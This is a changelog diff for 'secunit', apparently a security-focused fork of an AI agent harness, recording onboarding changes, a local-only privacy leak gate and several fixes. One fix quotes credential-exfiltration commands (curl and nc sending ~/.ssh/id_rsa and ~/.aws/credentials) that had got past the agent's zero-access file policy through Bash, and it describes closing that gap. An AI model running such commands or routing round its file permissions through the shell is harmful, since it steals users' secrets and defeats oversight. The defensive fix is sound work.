@@ -4,6 +4,35 @@ All notable changes to secunit are documented here. Format follows [Keep a Chang
 
 ---
 
+## [Unreleased]
+
+---
+
+## [0.7.0] — 2026-09-10
+
+Onboarding rewrite plus two new enforcement layers: Bash zero-access paths at tool time, and a local-only semantic leak review at release time.
+
+### Changed
+- README "why this fork" now names the three enforcement claims (fail-closed inspector chain, session canary, Bash zero-access paths) instead of "security instrumentation".
+- Removed `secunit-feature-diff.md`; superseded by `ForkArchitectureCatalog.md`.
+- **README rebuilt as layered onboarding.** The first screen is now install, three verified paste-able prompts ("Your first ten minutes" — one each for the security gate, skill activation, and memory), a four-concept map (modes / memory / skills / gates), and a "make it yours" section pointing at CLAUDE.md rules, `CreateSkill`, and `CreateCLI`. Everything it used to say — upstream diff, security architecture, inference routing, backend switching, knowledge pipeline, mobile access — moved intact to `PAI/DOCUMENTATION/secunit-DeepDive.md`. 457 lines → under 150.
+- **`/interview` is no longer the installer's step 3.** It is Life OS depth (mission, goals, preferences), not harness setup; the installer and README now point at the first-ten-minutes prompts first and offer `/interview` as optional.
+- **Public `CLAUDE.md` gains a "Your first session" block** naming the four mechanisms and where to look next.
+- **Skill roster corrected** to the 46 that ship (`DualCheck`, `SessionFork`, `Verify` were unlisted).
+- **`PAI-Install/` removed** (upstream v5.0 web/Electron wizard); root `install.sh` + `/interview` is the only install path.
+
+### Security
+- **Semantic leak gate added to the release pipeline** (`PAI/TOOLS/SemanticLeakGate.ts`, advisory). The deterministic gates match known patterns; this one sends every staged prose file, chunked, to a local-only model and asks whether a stranger would learn something private about a real person. Endpoint must resolve to a private-range host or the gate refuses to run; there is no cloud fallback by design. Flags are printed and repeated in the push prompt but never block on their own. Fails closed to "unreviewed" on any endpoint failure. Content-hash verdict cache means only changed prose is re-sent on later releases.
+- **`sharp` 0.35.0 → 0.35.4** (GHSA-rgj7-g3m4-5g8c, HIGH) in the release toolchain; Grype was blocking on it.
+
+### Fixed
+- **Prose-tip gate "flake" root-caused.** MiniMax M3 sometimes returns the final `[]` at the tail of its reasoning stream with an empty `content` and a normal stop. The classifier only read `content`, so a correct verdict parsed as EOF and the 5-call ensemble fell below its 3-parse floor. Reproduced 2/5 and 4/5 with the exact release prompt. The parser now falls back to the last JSON array in `reasoning`. Every prior release that "needed a retry" on this gate was hitting this.
+- **`NightlyCodeReview.ts` hardcoded a Tailscale IP** for its local inference host; now reads `OLLAMA_BASE_URL` with a loopback default. Cleared one of 20 identifier-gate hits that had blocked release since August; the other 19 were sanitize rules for three ADRs and the fork catalog.
+- **`TEMPLATES/User/Telos` renamed to `TELOS`** to match what the interview tools and SessionStart hook actually read. A fresh install previously scaffolded a directory nothing looked in.
+- **`paths.zeroAccess` was never enforced inside Bash commands.** `Read ~/.ssh/id_rsa` was denied while `cat ~/.ssh/id_rsa`, `curl -d "$(cat ~/.ssh/id_rsa)" …`, `curl -F f=@$HOME/.ssh/id_rsa …`, and `base64 ~/.aws/credentials | nc …` all passed. `PatternInspector` now extracts absolute and home-rooted paths from every Bash command and applies the same zero-access (deny) and alert-access (alert) policy the file tools use, ahead of the trusted-prefix short-circuit. New test file `hooks/__tests__/PatternInspector.bashpaths.test.ts`. ADR: `DOCUMENTATION/Decisions/bash-path-policy-zero-access-2026-09.md`.
+
+---
+
 ## [0.6.1] — 2026-08-04
 
 ### Fixed
